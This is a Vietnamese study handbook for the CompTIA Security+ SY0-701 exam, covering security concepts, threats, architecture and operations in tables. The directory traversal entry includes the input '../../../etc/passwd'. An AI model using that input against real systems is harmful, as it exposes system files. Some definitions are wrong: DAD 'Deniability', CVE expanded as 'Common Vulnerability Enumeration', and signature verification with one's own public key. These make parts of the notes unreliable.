# 🛡️ CompTIA Security+ SY0-701 — Cybersecurity Master Notes & Practice Handbook

> **Biên soạn bởi:** Tổng hợp từ toàn bộ tài liệu khóa học IPMAC + Official CompTIA Objectives + Concise Study Guide  
> **Mục tiêu:** Phục vụ thi SY0-701, CTF, eJPT, pentest thực chiến  
> **Format:** Khái niệm → Giải thích thực chiến → Tools → Lab/Practice → Exam Notes

---

## 📋 Tổng quan kỳ thi SY0-701

| Thông tin | Chi tiết |
|---|---|
| Mã đề | SY0-701 |
| Số câu | Tối đa 90 câu |
| Loại câu hỏi | Multiple-choice + Performance-based (kéo thả, mô phỏng) |
| Thời gian | 90 phút |
| Kinh nghiệm khuyến nghị | 2+ năm IT với focus bảo mật |

### Phân bố domain (% số câu):

| Domain | % |
|---|---|
| 1.0 General Security Concepts | 12% |
| 2.0 Threats, Vulnerabilities & Mitigations | 22% |
| 3.0 Security Architecture | 18% |
| 4.0 Security Operations | 28% ⭐ (quan trọng nhất) |
| 5.0 Security Program Management & Oversight | 20% |

---

# DOMAIN 1: GENERAL SECURITY CONCEPTS (12%)

## 1.1 — CIA Triad & DAD Triad

### Khái niệm

**CIA Triad** — mục tiêu của defender:
- **Confidentiality (Bảo mật):** Dữ liệu chỉ được truy cập bởi người có quyền. Công cụ: encryption, passwords, biometrics, 2FA.
- **Integrity (Toàn vẹn):** Dữ liệu không bị thay đổi trái phép. Công cụ: hashing, checksums, digital signatures.
- **Availability (Sẵn sàng):** Dữ liệu luôn có thể truy cập khi cần. Công cụ: redundancy, load balancing, UPS.

**DAD Triad** — mục tiêu của attacker:
- **Disclosure:** Truy cập dữ liệu không được phép (Trojan, brute force, theft)
- **Alteration:** Sửa đổi dữ liệu (malware, SQLi)
- **Deniability:** Chặn truy cập dữ liệu (DoS, DDoS, ransomware)

**Non-repudiation:** Không thể chối bỏ hành động — đạt được qua digital signatures + audit logs.

### Exam Notes
> ⭐ CIA = Defender mindset. DAD = Attacker mindset. Luôn nhớ cặp này khi làm bài.
> Non-repudiation thường đi kèm với **digital signatures** trong câu hỏi.

---

## 1.2 — NIST Cybersecurity Framework (CSF)

### 5 chức năng NIST:

| Chức năng | Mô tả |
|---|---|
| **Identify** | Đánh giá rủi ro, mối đe dọa, lỗ hổng |
| **Protect** | Triển khai và vận hành biện pháp bảo vệ |
| **Detect** | Giám sát liên tục, phát hiện tấn công |
| **Respond** | Phân tích, ngăn chặn, loại bỏ mối đe dọa |
| **Recover** | Phục hồi hệ thống sau tấn công |

> 💡 **Mẹo nhớ:** "I Protect Deeply Responding Readily" — Identify, Protect, Detect, Respond, Recover

---

## 1.3 — Security Controls

### Categories (Loại kiểm soát):

| Loại | Ý nghĩa | Ví dụ |
|---|---|---|
| **Technical (Logical)** | Hệ thống thực hiện | Firewall, antivirus, OS access control |
| **Operational** | Con người thực hiện | Security guards, training programs |
| **Managerial** | Giám sát tổ chức | Risk policies, security frameworks |
| **Physical** | Vật lý ngăn chặn | Locks, cameras, barriers |

### Control Types (Chức năng kiểm soát):

| Loại | Mục đích | Ví dụ thực tế |
|---|---|---|
| **Preventive** | Ngăn chặn tấn công trước khi xảy ra | ACLs, antivirus, MFA |
| **Detective** | Phát hiện tấn công khi xảy ra | IDS, logs, audit trails |
| **Corrective** | Khắc phục sau tấn công | Backups, patch management |
| **Deterrent** | Tâm lý ngăn chặn kẻ tấn công | Warning signs, legal penalties |
| **Compensating** | Thay thế control chính không có | Camera thay cho guard |
| **Directive** | Hướng dẫn/ra lệnh hành vi | Policies, SOPs |

### Defense-in-Depth
Nhiều lớp bảo vệ chồng lên nhau, độc lập nhau. Nếu 1 lớp bị vượt qua, còn các lớp khác.

### Fine-Tuning Controls:
- **Scoping:** Loại bỏ recommendations không áp dụng
- **Tailoring:** Tùy chỉnh baseline cho phù hợp mục tiêu
- **Compensating:** Thay thế bằng control khác tương đương
- **Supplementing:** Bổ sung thêm vào baseline

---

## 1.4 — Gap Analysis

Quá trình so sánh hệ thống bảo mật hiện tại với yêu cầu framework/compliance. Kết quả bao gồm:
- Overall score cho từng section
- Danh sách controls thiếu hoặc cấu hình sai
- Khuyến nghị remediation

---

## 1.5 — Zero Trust Architecture

### Nguyên tắc: "Never trust, always verify"

**Control Plane:**
- **Adaptive Identity:** Xác thực liên tục dựa trên context
- **Threat Scope Reduction:** Thu hẹp attack surface
- **Policy-driven Access Control:** Quyết định truy cập theo policy
- **Policy Administrator:** Thực thi quyết định từ Policy Engine
- **Policy Engine:** Trung tâm ra quyết định

**Data Plane:**
- **Implicit Trust Zones:** Vùng được tin cậy mặc định (cần loại bỏ)
- **Subject/System:** Thực thể yêu cầu truy cập
- **Policy Enforcement Point (PEP):** Điểm kiểm tra và thực thi policy

### Exam Notes
> ⭐ Zero Trust phổ biến trong câu hỏi về cloud security và remote work. Nhớ: không có "trusted network" trong mô hình này.

---

## 1.6 — Cryptography (Domain 1.4)

### Hashing Algorithms

| Thuật toán | Output Size | Trạng thái |
|---|---|---|
| **MD5** | 128-bit | ❌ Không an toàn (collision) |
| **SHA-1** | 160-bit | ❌ Deprecated |
| **SHA-256** | 256-bit | ✅ Được khuyến nghị |
| **SHA-3** | Biến thể | ✅ Mới nhất |

**Birthday Attack:** Brute force khai thác collision trong hash functions → dùng để forge digital signatures.

### Symmetric Encryption

Cùng một key để encrypt và decrypt. **Nhanh**, dùng cho bulk data.

| Thuật toán | Key Size | Ghi chú |
|---|---|---|
| **AES** | 128, 192, 256-bit | ✅ Chuẩn hiện đại |
| **DES** | 56-bit | ❌ Quá yếu |
| **3DES** | 168-bit | ⚠️ Deprecated |
| **RC4** | Biến thể | ❌ Không an toàn |

**Stream cipher:** Encrypt từng bit/byte — dùng cho real-time (VoIP).
**Block cipher:** Encrypt từng block (thường 128-bit) — dùng cho file/disk.

### Asymmetric Encryption (Public Key Cryptography)

Hai key: **Public Key** (public) + **Private Key** (secret). Chậm hơn symmetric.

| Dùng để | Cách làm |
|---|---|
| **Gửi tin bí mật** | Encrypt bằng PUBLIC KEY của người nhận → chỉ họ decrypt được bằng PRIVATE KEY |
| **Xác thực/Ký** | Ký bằng PRIVATE KEY của mình → người khác verify bằng PUBLIC KEY của mình |

Thuật toán phổ biến: **RSA** (Rivest, Shamir, Adleman — 1977), **ECC** (Elliptic Curve — hiệu quả hơn RSA với key nhỏ hơn).

### Hybrid Encryption
Thực tế: dùng asymmetric để trao đổi symmetric key, sau đó dùng symmetric cho bulk data.

### Key Exchange: Diffie-Hellman (DH/DHE/ECDHE)
Cho phép hai bên trao đổi symmetric key qua kênh không an toàn mà không lộ key.
- **DHE (Ephemeral):** Tạo key mới cho mỗi session → **Perfect Forward Secrecy (PFS)**

### Salting & Key Stretching

**Salting:** Thêm giá trị ngẫu nhiên vào password trước khi hash.
```
Hash = SHA256(Salt + Password)
```
Mục đích: Ngăn rainbow table attacks.

**Key Stretching (PBKDF2, bcrypt, Argon2):** Lặp lại hash nhiều lần để làm brute force chậm hơn.

### Digital Signatures
```
1. Sender tạo hash của message
2. Sender ký hash bằng PRIVATE KEY của mình
3. Người nhận dùng PUBLIC KEY của sender để verify
4. Nếu match → đảm bảo Authenticity + Non-repudiation + Integrity
```

### PKI (Public Key Infrastructure)

**Certificate Authority (CA):** Tổ chức cấp và ký digital certificates.

**Certificate Chain (Chain of Trust):**
```
Root CA (offline) → Intermediate CA → End Entity Certificate
```

**PKI Trust Models:**
- **Single CA:** Đơn giản, single point of failure
- **Hierarchical:** Root CA → Intermediate CAs → Leaf certs (phổ biến nhất)

**Certificate Fields quan trọng:**
- Subject (CN = Common Name = FQDN hoặc email)
- Subject Alternative Name (SAN) — preferred cho multi-domain
- Serial Number
- Valid From/To
- Public Key
- Issuer (CA name)

**Wildcard Certificate:** `*.comptia.org` — hợp lệ cho TẤT CẢ subdomain.

**Certificate Revocation:**
- **CRL (Certificate Revocation List):** Danh sách certs bị thu hồi — download định kỳ
- **OCSP (Online Certificate Status Protocol):** Real-time check trạng thái cert

**Key Escrow:** Third party giữ backup của private key (dùng trong doanh nghiệp).

### Steganography
Ẩn thông tin trong file khác (ảnh, audio, video) mà không thay đổi file nhìn bề ngoài.

### Blockchain
Chuỗi block dữ liệu, mỗi block chứa hash của block trước → bất biến, distributed.

---

## 1.7 — Physical Security

### Deception & Disruption Technologies

| Công nghệ | Mục đích |
|---|---|
| **Honeypot** | Server giả thu hút attacker |
| **Honeynet** | Network honeypots |
| **Honeyfile** | File giả chứa fake data |
| **Honeytoken** | Credential/data giả để phát hiện breach |

**DNS Sinkhole:** Chuyển hướng traffic nghi ngờ sang honeynet.

### Physical Access Controls
- **Bollards:** Cột bê tông ngăn xe
- **Access Control Vestibule (Mantrap):** Phòng đệm kiểm soát 2 lớp
- **Fencing, Lighting, Cameras (CCTV)**
- **Access Badges**
- **Sensors:** Infrared, Pressure, Microwave, Ultrasonic

### Physical Attacks:
- **Card Cloning:** Sao chép card từ card gốc
- **Skimming:** Đọc dữ liệu card qua reader giả
- **Juice Jacking:** USB charging tấn công — chống bằng USB Data Blocker
- **Shoulder Surfing:** Nhìn lén màn hình

### Secure Data Destruction:
- **Degaussing:** Dùng từ trường mạnh để xóa HDD
- **Shredding/Pulverizing:** Phá hủy vật lý
- **Secure Erase (SE):** Firmware-level zero-fill
- **Instant Secure Erase (ISE):** Xóa encryption key của Self-Encrypting Drive (SED)

---

# DOMAIN 2: THREATS, VULNERABILITIES & MITIGATIONS (22%)

## 2.1 — Threat Actors

### Phân loại:

| Actor | Đặc điểm | Motivation |
|---|---|---|
| **Nation-State / APT** | Cao nhất về kỹ năng & funding | Espionage, war, disruption |
| **Organized Crime** | Tài chính tốt, kỹ năng cao | Financial gain |
| **Hacktivist** | Ý thức hệ, chính trị | Political/ethical beliefs |
| **Insider Threat** | Có quyền truy cập nội bộ | Revenge, financial, espionage |
| **Script Kiddie** | Kỹ năng thấp, dùng tool sẵn | Curiosity, fun |
| **Shadow IT** | Nhân viên dùng IT không được phê duyệt | Convenience |

### Attributes:
- **Internal vs External:** Internal = có tài khoản, nguy hiểm hơn
- **Resources/Funding:** Quyết định scope tấn công
- **Level of Sophistication/Capability:** Khả năng tạo zero-day vs dùng tool cũ

---

## 2.2 — Threat Vectors & Attack Surfaces

### Attack Vectors:

| Vector | Ví dụ |
|---|---|
| **Message-based** | Email phishing, SMS smishing, IM |
| **Voice call** | Vishing |
| **File-based** | Malicious attachment |
| **Removable Device** | USB drop attack |
| **Vulnerable Software** | Unpatched CVE |
| **Unsecured Networks** | Open WiFi, Bluetooth |
| **Default Credentials** | Admin/admin |
| **Supply Chain** | MSPs, vendors, suppliers bị compromise |

### Attack Surface = Tổng tất cả điểm có thể bị attack. Minimize = restrict ports, services, users.

---

## 2.3 — Social Engineering

### Kỹ thuật:

| Kỹ thuật | Mô tả |
|---|---|
| **Phishing** | Email giả mạo lấy credentials |
| **Spear Phishing** | Phishing nhắm mục tiêu cụ thể |
| **Whaling** | Phishing nhắm C-level executives |
| **Vishing** | Voice phishing qua điện thoại |
| **Smishing** | SMS phishing |
| **Pretexting** | Tạo câu chuyện giả để lấy thông tin |
| **Baiting** | Thả USB nhiễm malware |
| **Watering Hole** | Compromise website mà target thường vào |
| **Typosquatting** | Domain giống thật nhưng sai chính tả (facbook.com) |
| **Piggybacking/Tailgating** | Theo vào khu vực restricted |
| **Shoulder Surfing** | Nhìn lén |
| **Dumpster Diving** | Tìm thông tin trong thùng rác |
| **Brand Impersonation** | Giả mạo thương hiệu |
| **Business Email Compromise (BEC)** | Compromise email business |

---

## 2.4 — Vulnerability Types

### Application Vulnerabilities:

| Lỗ hổng | Mô tả | Phòng chống |
|---|---|---|
| **Buffer Overflow** | Overflow bộ nhớ, overwrite adjacent memory | Input validation, safe functions |
| **Integer Overflow** | Tràn số nguyên → số âm | Bounds checking |
| **SQL Injection (SQLi)** | Inject SQL query vào input | Parameterized queries, WAF |
| **Cross-Site Scripting (XSS)** | Inject script vào web page | Input sanitization, CSP |
| **Race Condition (TOC/TOU)** | Time-of-Check vs Time-of-Use mismatch | Atomic operations, locking |
| **Memory Injection** | Inject code vào process khác | DEP, ASLR |
| **DLL Injection** | Inject malicious DLL | Code signing, monitoring |

### OS / Web / Hardware Vulnerabilities:
- **OS-based:** Unpatched kernel, privilege escalation paths
- **Firmware:** Flash memory bugs, BIOS/UEFI attacks
- **End-of-Life/Legacy:** Không còn patch → luôn vulnerable

### Mobile Vulnerabilities:
- **Jailbreaking (iOS):** Boot với patched kernel → bypass security
- **Rooting (Android):** Custom firmware → root access
- **Sideloading:** Cài app ngoài App Store/Play Store

### Virtualization Vulnerabilities:
- **VM Escape:** Attacker thoát ra khỏi VM vào host
- **Resource Reuse:** Data của VM cũ lộ cho VM mới

### Supply Chain Vulnerabilities:
- Service provider, hardware provider, software provider bị compromise

### Zero-Day:
Lỗ hổng chưa có patch, đang bị khai thác. Rất nguy hiểm.

---

## 2.5 — Malware

### Phân loại theo vector (cách lây lan):

| Malware | Cách lây | Đặc điểm |
|---|---|---|
| **Virus** | Phải có host file để lây | Cần user action |
| **Worm** | Tự lây qua network | Không cần user action |
| **Trojan** | Giả vờ là phần mềm hợp lệ | Phải do user chạy |
| **Fileless Malware** | Không ghi file xuống disk | Dùng PowerShell, WMI, LOLBins |
| **Rootkit** | Ring 0 (kernel level) | Ẩn sâu nhất, khó detect |
| **Ransomware** | Mã hóa file đòi tiền chuộc | Crypto + payment demand |
| **Spyware/Keylogger** | Thu thập thông tin bí mật | Record keystrokes, screenshots |
| **Backdoor/RAT** | Remote access ẩn | Command & Control (C2) |
| **Logic Bomb** | Trigger theo điều kiện | Thường do insider threat |
| **Botnet** | Mạng bot dưới quyền herder | DDoS, spam |
| **Bloatware** | PUP/PUA cài kèm | Không nhất thiết malicious |

### Virus Types:
- **Non-Resident/File Infector:** Lây vào executable
- **Memory Resident:** Tồn tại trong RAM
- **Boot Sector:** Lây vào MBR, chạy trước OS
- **Macro Virus:** Trong Office documents
- **Polymorphic:** Tự thay đổi code để tránh detection

### Malware Indicators (IOC):
- Antivirus alerts
- Unexpected resource consumption (CPU, RAM, disk)
- Suspicious network connections
- Unauthorized file/registry changes
- Account lockouts
- Impossible travel (login từ 2 địa điểm cùng lúc)

---

## 2.6 — Network & Application Attacks

### Network Attacks:

| Attack | Mô tả |
|---|---|
| **DDoS (Amplified)** | Dùng UDP amplification (DNS, NTP) để multiply traffic |
| **DDoS (Reflected)** | Dùng IP spoofing → phản xạ traffic về victim |
| **On-path (MITM)** | Đứng giữa hai bên, intercept traffic |
| **DNS Attack** | DNS poisoning, hijacking |
| **Credential Replay** | Dùng lại stolen session token |
| **Wireless Attack** | Evil twin, deauth, WPS cracking |

### Application Attacks:

| Attack | Mô tả |
|---|---|
| **Injection** | SQL, LDAP, Command injection |
| **Buffer Overflow** | Overwrite memory |
| **Replay Attack** | Reuse captured authentication token |
| **Privilege Escalation** | Horizontal (lateral) / Vertical (to admin) |
| **Directory Traversal** | `../../../etc/passwd` |
| **CSRF/XSRF** | Khai thác session cookie để fake request |
| **Clickjacking** | Ẩn UI element dưới transparent layer |
| **SSL Strip** | Downgrade HTTPS → HTTP |

### Password Attacks:

| Attack | Mô tả |
|---|---|
| **Brute Force** | Thử mọi combination |
| **Dictionary Attack** | Wordlist + hashing |
| **Password Spraying** | 1 password thử nhiều accounts (tránh lockout) |
| **Rainbow Table** | Precomputed hash lookup |
| **Pass-the-Hash (PtH)** | Dùng NTLM hash không cần crack |
| **Credential Stuffing** | Dùng leaked credentials từ breach khác |

### Cryptographic Attacks:

| Attack | Mô tả |
|---|---|
| **Birthday Attack** | Exploit hash collision |
| **Downgrade Attack** | Force dùng protocol yếu hơn (SSLv2, MD5) |
| **Collision Attack** | Tìm 2 inputs có cùng hash |

### Physical Attacks:
- **RFID Cloning:** Sao chép thẻ RFID
- **Environmental:** Phá hủy vật lý, cắt điện

---

## 2.7 — Mitigation Techniques

| Technique | Mô tả |
|---|---|
| **Segmentation** | Chia mạng thành các segment nhỏ (VLAN) |
| **Access Control (ACL)** | Chỉ cho phép traffic cần thiết |
| **Application Allow List** | Chỉ cho phép chạy app được approve |
| **Isolation** | Cô lập hệ thống bị nhiễm |
| **Patching** | Vá lỗ hổng kịp thời |
| **Encryption** | Bảo vệ data at rest & in transit |
| **Least Privilege** | Chỉ cấp quyền tối thiểu cần thiết |
| **Hardening** | Loại bỏ services thừa, đổi default passwords, enable firewall |
| **Configuration Enforcement** | Baseline configuration, SCAP |
| **Decommissioning** | Tắt/xóa systems không còn dùng |

---

# DOMAIN 3: SECURITY ARCHITECTURE (18%)

## 3.1 — Architecture Models

### Cloud Service Models:

| Model | Vendor quản lý | Customer quản lý |
|---|---|---|
| **IaaS** | Physical, hypervisor | OS, apps, data |
| **PaaS** | Physical, hypervisor, OS, runtime | Apps, data |
| **SaaS** | Everything | Just data/config |

### Cloud Deployment Models:
- **Public:** AWS, Azure, GCP — shared infrastructure
- **Private:** Dedicated cho 1 org
- **Hybrid:** Mix public + private
- **Community:** Shared giữa một nhóm tổ chức

**Shared Responsibility Matrix:** Ai chịu trách nhiệm về gì trong cloud.

### Other Architecture Types:

| Type | Đặc điểm |
|---|---|
| **Infrastructure as Code (IaC)** | Provisioning qua code (Terraform, Ansible) |
| **Serverless** | Function-as-a-Service, không lo về server |
| **Microservices** | App chia nhỏ thành services độc lập |
| **Containerization** | Docker, Kubernetes — isolated processes |
| **Virtualization** | VM trên hypervisor |
| **IoT** | Embedded devices, sensor |
| **ICS/SCADA** | Industrial control systems |
| **RTOS** | Real-time OS (hard timing requirements) |
| **Air-gapped** | Không kết nối mạng |

---

## 3.2 — Secure Network Infrastructure

### Network Segmentation:
- **DMZ (Demilitarized Zone):** Public-facing servers giữa external và internal firewall
- **VLANs:** Logical segmentation
- **Screened Subnets:** Similar to DMZ

### Network Devices & Placement:

| Device | Chức năng |
|---|---|
| **Firewall** | Filter traffic theo rules |
| **WAF (Web Application Firewall)** | Layer 7, protect web apps từ SQLi, XSS |
| **NGFW (Next-Gen Firewall)** | Deep packet inspection, app-aware |
| **UTM (Unified Threat Management)** | All-in-one: firewall + IPS + AV + VPN |
| **IDS (Intrusion Detection System)** | Passive — detect và alert |
| **IPS (Intrusion Prevention System)** | Inline — detect và block |
| **Proxy Server** | Intermediary, caching, filtering |
| **Jump Server/Bastion Host** | Single entry point vào admin zone |
| **Load Balancer** | Phân tải traffic |

### Firewall Types:
- **Layer 4:** Filter by IP/port
- **Layer 7:** Filter by application/content

### Failure Modes:
- **Fail-Open:** Nếu device fail → traffic vẫn qua (availability over security)
- **Fail-Closed:** Nếu device fail → block all traffic (security over availability)

### Device Attributes:
- **Active vs Passive:** Active can block; passive only monitors
- **Inline vs Tap/Monitor:** Inline = traffic goes through; tap = copy of traffic

### Port Security:
- **802.1X:** Port-based Network Access Control (NAC)
- **EAP (Extensible Authentication Protocol):** Framework cho 802.1X auth

---

## 3.3 — Secure Communication

### VPN Types:
- **Site-to-Site VPN:** Connect hai offices qua internet
- **Remote Access VPN:** Individual user kết nối vào corporate network
- **Split Tunneling:** Chỉ corporate traffic qua VPN, internet traffic trực tiếp

### VPN Protocols:

| Protocol | Port | Notes |
|---|---|---|
| **IPSec (Tunnel mode)** | UDP 500, 4500 | L3 VPN, site-to-site |
| **TLS/SSL VPN** | TCP 443 | Web-based, client VPN |
| **L2TP/IPSec** | UDP 1701 | Older |
| **WireGuard** | UDP 51820 | Modern, fast |

### SD-WAN & SASE:
- **SD-WAN:** Software-defined WAN — flexible, centrally managed
- **SASE (Secure Access Service Edge):** Cloud-delivered security (SD-WAN + security)

---

## 3.4 — Data Protection

### Data States:

| State | Mô tả | Bảo vệ bằng |
|---|---|---|
| **Data at Rest** | Lưu trữ trên disk/DB | AES encryption, ACLs |
| **Data in Transit** | Truyền qua mạng | TLS, IPSec, HTTPS |
| **Data in Use** | Đang xử lý trong RAM | TEE (Trusted Execution Environment), SGX |

### Data Classifications:

| Level | Mô tả |
|---|---|
| **Public** | Không có hại nếu lộ |
| **Private/Confidential** | Chỉ nội bộ hoặc authorized parties |
| **Sensitive** | Có thể gây hại nghiêm trọng |
| **Restricted/Critical** | Top secret — cực kỳ hạn chế |

### Encryption Levels:
- **Full-Disk Encryption (FDE):** BitLocker (Windows), FileVault (macOS)
- **Volume/Partition Encryption**
- **File Encryption**
- **Database/Record Encryption**

### Data Obfuscation Techniques:

| Technique | Mô tả |
|---|---|
| **Tokenization** | Thay giá trị thật bằng token ngẫu nhiên |
| **Data Masking** | Thay bằng "XXXX" |
| **Anonymization** | Xóa hoàn toàn PII |
| **Pseudo-anonymization** | Thay thế nhưng có thể reverse |
| **Steganography** | Ẩn data trong file khác |

### Data Roles:

| Role | Trách nhiệm |
|---|---|
| **Data Owner** | Senior exec — ultimate responsibility |
| **Data Steward** | Data quality & labeling |
| **Data Custodian** | Quản lý hệ thống lưu trữ data |
| **Data Privacy Officer (DPO)** | PII oversight |
| **Data Controller** | Quyết định WHY & HOW data được dùng |
| **Data Processor** | Thực hiện kỹ thuật theo controller |

---

## 3.5 — Resilience & Recovery

### Backup Sites:

| Site | Mô tả | RTO |
|---|---|---|
| **Hot Site** | Replica đầy đủ, sẵn sàng ngay | Phút |
| **Warm Site** | Phần cơ sở hạ tầng có sẵn | Giờ |
| **Cold Site** | Chỉ có mặt bằng và nguồn điện | Ngày/tuần |

### Key Metrics:

| Metric | Nghĩa |
|---|---|
| **RTO (Recovery Time Objective)** | Thời gian tối đa để restore service |
| **RPO (Recovery Point Objective)** | Lượng data tối đa có thể mất |
| **MTTR (Mean Time To Repair)** | Thời gian trung bình sửa chữa |
| **MTBF (Mean Time Between Failures)** | Thời gian trung bình giữa các lần hỏng |
| **MTTF (Mean Time To Failure)** | Dùng cho non-repairable assets |
| **MTD (Maximum Tolerable Downtime)** | Thời gian downtime tối đa trước khi không recover được |

### Backup Types:
- **Full:** Toàn bộ data mỗi lần
- **Incremental:** Chỉ data thay đổi từ backup cuối (nhanh backup, chậm restore)
- **Differential:** Thay đổi từ Full backup gần nhất (chậm backup, nhanh restore hơn incremental)
- **Snapshot:** Point-in-time capture

### Testing Methods:

| Type | Mô tả |
|---|---|
| **Tabletop Exercise** | Thảo luận scenario không thực hành thực tế |
| **Walkthrough/Simulation** | Mô phỏng incident |
| **Functional Exercise** | Action-based trong môi trường simulation |
| **Full-Scale Exercise** | Thực tế hoàn toàn với real equipment |
| **Failover Test** | Test actual failover mechanism |
| **Parallel Processing** | Chạy primary và backup song song |

### High Availability:
- **Load Balancing:** Phân tải traffic
- **Clustering:** Multiple servers hoạt động như 1 đơn vị
- **Geographic Dispersion:** Data centers nhiều địa điểm

---

# DOMAIN 4: SECURITY OPERATIONS (28%) ⭐

## 4.1 — Vulnerability Management

### Vulnerability Identification:

| Method | Mô tả |
|---|---|
| **Vulnerability Scan** | Automated scan dựa trên CVE database |
| **Static Analysis (SAST)** | Phân tích source code |
| **Dynamic Analysis (DAST)** | Test app đang chạy (blackbox) |
| **Penetration Testing** | Mô phỏng tấn công thực sự |
| **Bug Bounty** | Crowd-sourced vulnerability disclosure |
| **OSINT** | Open-source threat intelligence |

### CVSS Scores:

| Score | Severity |
|---|---|
| 0.0 | None |
| 0.1-3.9 | Low |
| 4.0-6.9 | Medium |
| 7.0-8.9 | High |
| 9.0-10.0 | Critical |

**CVE (Common Vulnerability Enumeration):** Định danh cho mỗi vulnerability (VD: CVE-2021-44228 = Log4Shell).
**NVD (National Vulnerability Database):** Cơ sở dữ liệu CVE kèm CVSS scores.

### False Positive/Negative:

| | Thực tế Normal | Thực tế Abnormal |
|---|---|---|
| **Detected as Normal** | True Negative ✅ | **False Negative ❌ NGUY HIỂM** |
| **Detected as Abnormal** | **False Positive ⚠️ PHIỀN** | True Positive ✅ |

### Vulnerability Response:
1. **Patch** (ưu tiên #1)
2. **Compensating Controls** (nếu không patch được ngay)
3. **Insurance** (transfer risk)
4. **Segmentation** (isolate vulnerable system)
5. **Exceptions/Exemptions** (chấp nhận rủi ro có documented)

---

## 4.2 — Monitoring & Alerting

### SIEM (Security Information and Event Management)
- Thu thập và correlate logs từ nhiều nguồn
- Real-time alerting
- Long-term storage và reporting

### Monitoring Tools:

| Tool | Chức năng |
|---|---|
| **SIEM** | Log aggregation + correlation + alerting |
| **IDS/IPS** | Network/host intrusion detection/prevention |
| **DLP (Data Loss Prevention)** | Phát hiện và ngăn data exfiltration |
| **UEBA** | User & Entity Behavior Analytics — detect anomalies |
| **EDR (Endpoint Detection & Response)** | Endpoint monitoring và automated response |
| **XDR (Extended DR)** | EDR mở rộng ra network, cloud, email |
| **SOAR** | Security Orchestration, Automation, Response |
| **TIP (Threat Intelligence Platform)** | Aggregate threat feeds |
| **NetFlow** | Network traffic analysis |
| **SNMP Traps** | Network device alerts |
| **Vulnerability Scanner** | Nessus, OpenVAS |
| **SCAP** | Security Content Automation Protocol |

### Log Data Sources:
- Firewall logs
- Application logs
- Endpoint logs
- OS security logs (Windows Event Log, syslog)
- IDS/IPS logs
- Network logs
- DNS logs
- Authentication logs
- Metadata

### Activities:
- **Log Aggregation:** Tập trung logs về 1 chỗ
- **Alerting:** Thông báo khi phát hiện anomaly
- **Scanning:** Định kỳ scan vulnerabilities
- **Archiving:** Lưu trữ lâu dài cho compliance
- **Alert Tuning:** Giảm false positives

---

## 4.3 — Identity & Access Management (IAM)

### Authentication Factors:

| Factor | Loại | Ví dụ |
|---|---|---|
| **Something you know** | Knowledge | Password, PIN, security question |
| **Something you have** | Possession | Smart card, hardware token, OTP |
| **Something you are** | Inherence (Biometric) | Fingerprint, iris, face |
| **Somewhere you are** | Location | GPS, IP geolocation |

**MFA = ít nhất 2 factors khác loại nhau**
> ❌ PIN + Security Question = KHÔNG phải MFA (cả hai đều là "something you know")

### Biometrics:

| Metric | Nghĩa |
|---|---|
| **FAR (False Acceptance Rate)** | Intruder được accept = Type 2 Error (nguy hiểm) |
| **FRR (False Rejection Rate)** | Legitimate user bị reject = Type 1 Error (phiền) |
| **CER (Crossover Error Rate)** | Điểm FAR = FRR → CER thấp = biometric tốt hơn |

### Password Best Practices (NIST guidelines mới):
- Không enforce complexity rules (không cần ký tự đặc biệt bắt buộc)
- Không enforce aging/expiry
- Không dùng password hints
- **Block common passwords** (123456, password, v.v.)
- Minimum length (>= 8 ký tự, khuyến nghị >= 15)
- Password manager được khuyến khích

### Access Control Models:

| Model | Mô tả | Ví dụ |
|---|---|---|
| **MAC (Mandatory)** | OS kiểm soát, label-based | SELinux, military |
| **DAC (Discretionary)** | Owner quyết định | NTFS permissions |
| **RBAC (Role-based)** | Permissions theo role | Job function |
| **ABAC (Attribute-based)** | Flexible policy theo attributes | Time, location, device |
| **Rule-based** | If-then rules | Firewall ACLs |
| **Least Privilege** | Quyền tối thiểu cần thiết | Standard practice |

### SSO (Single Sign-On) Protocols:

| Protocol | Mô tả |
|---|---|
| **LDAP** | Directory service lookup (TCP 389) |
| **LDAPS** | LDAP over SSL (TCP 636) |
| **SAML** | XML-based SSO cho web apps (enterprise) |
| **OAuth 2.0** | Authorization delegation (social login) |
| **OpenID Connect** | Authentication trên OAuth (login with Google) |
| **Kerberos** | Ticket-based auth trong Windows AD |

### Privileged Access Management (PAM):
- **Just-in-Time (JIT) Permissions:** Cấp quyền tạm thời khi cần
- **Password Vaulting:** Lưu trữ credentials cho privileged accounts
- **Ephemeral Credentials:** Credentials tự hủy sau thời gian ngắn
- **Secure Administrative Workstation (SAW):** Máy tính low attack surface cho admin tasks

---

## 4.4 — Enterprise Security Capabilities

### Firewall Rules:
```
Deny All, Permit Exceptions
Source IP → Dest IP → Port → Action
```

### Email Security:

| Protocol | Chức năng |
|---|---|
| **SPF (Sender Policy Framework)** | List IP được phép gửi email từ domain |
| **DKIM (DomainKeys Identified Mail)** | Ký email bằng private key |
| **DMARC** | Policy: làm gì nếu SPF/DKIM fail (quarantine/reject) |

Thứ tự check: SPF → DKIM → DMARC

### DNS Security:
- **DNSSEC:** Ký DNS records với digital signature
- **DNS Filtering:** Block malicious domains
- **DNS Sinkhole:** Redirect malicious traffic

### Web Filter:
- **Agent-based:** Software trên endpoint
- **Centralized Proxy:** Tất cả traffic qua proxy
- **URL Scanning + Content Categorization**

### Network Access Control (NAC):
- 802.1X authentication trước khi cho vào network
- Kiểm tra health của device (AV updated, patched, v.v.)

---

## 4.5 — Incident Response

### IR Process (PICERL):

| Bước | Mô tả |
|---|---|
| **Preparation** | Policies, tools, training sẵn sàng |
| **Identification/Detection** | Phát hiện incident |
| **Containment** | Ngăn lan rộng (short-term + long-term) |
| **Eradication** | Loại bỏ hoàn toàn threat |
| **Recovery** | Restore systems về hoạt động bình thường |
| **Lessons Learned** | Post-incident review |

### Digital Forensics:

| Concept | Mô tả |
|---|---|
| **Legal Hold** | Preserve evidence cho litigation |
| **Chain of Custody** | Tài liệu ai đã xử lý evidence |
| **Order of Volatility** | Thu thập evidence từ volatile → non-volatile |
| **Write Blocker** | Ngăn ghi dữ liệu lên evidence disk |
| **E-Discovery** | Thu thập digital evidence cho pháp lý |

### Order of Volatility (quan trọng):
1. CPU registers & cache
2. RAM (routing table, ARP cache)
3. Persistent storage (HDD, SSD)
4. Remote logging data
5. Physical config & network topology
6. Archival media

### Forensic Tools:
- **EnCase:** Case management, enterprise
- **FTK (Forensic Toolkit):** Windows-based investigation suite
- **Autopsy/Sleuth Kit:** Open source, GUI forensics
- **Volatility Framework:** RAM/memory analysis
- **WinHex:** Binary/hex editor

### Packet Capture Modes:
- **Normal:** Chỉ bắt frames cho NIC mình
- **Promiscuous:** Bắt tất cả frames trên segment
- **Unfiltered:** Bắt tất cả không filter
- **Filtered:** Chỉ bắt theo filter nhất định

---

